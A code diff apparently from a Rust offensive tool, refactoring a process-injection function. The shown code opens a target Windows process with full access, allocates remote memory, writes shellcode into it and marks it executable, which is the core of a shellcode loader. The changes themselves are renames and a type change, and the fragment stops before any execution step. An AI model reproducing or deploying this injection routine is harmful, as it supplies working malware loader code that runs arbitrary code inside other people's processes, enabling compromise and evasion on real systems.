@@ -45,18 +45,18 @@ pub fn find_process(name: &str) -> Result<ProcessId, FindProcessError> {
     }
 }
 
-pub fn inject(pid: ProcessId, payload: impl Payload) -> Result<(), InjectionError> {
+pub fn inject(pid: ProcessId, shellcode: Shellcode) -> Result<(), InjectionError> {
     unsafe {
         let Ok(process_handle) = OpenProcess(PROCESS_ALL_ACCESS, false, pid.0) else {
             return Err(InjectionError::OpenProcessError);
         };
 
-        let shell_code = payload.shellcode();
+        let shellcode = shellcode.raw().as_slice();
 
         let memory_ptr = VirtualAllocEx(
             process_handle,
             None,
-            shell_code.len(),
+            shellcode.len(),
             MEM_COMMIT,
             PAGE_READWRITE,
         );
@@ -69,8 +69,8 @@ pub fn inject(pid: ProcessId, payload: impl Payload) -> Result<(), InjectionErro
         let Ok(_) = WriteProcessMemory(
             process_handle,
             memory_ptr,
-            shell_code.as_ptr() as *const std::ffi::c_void,
-            shell_code.len(),
+            shellcode.as_ptr() as *const std::ffi::c_void,
+            shellcode.len(),
             None,
         ) else {
             let _ = CloseHandle(process_handle);
@@ -81,7 +81,7 @@ pub fn inject(pid: ProcessId, payload: impl Payload) -> Result<(), InjectionErro
         let Ok(_) = VirtualProtectEx(
             process_handle,
             memory_ptr,
-            shell_code.len(),
+            shellcode.len(),
             PAGE_EXECUTE_READ,
             &mut old_protect,
         ) else {
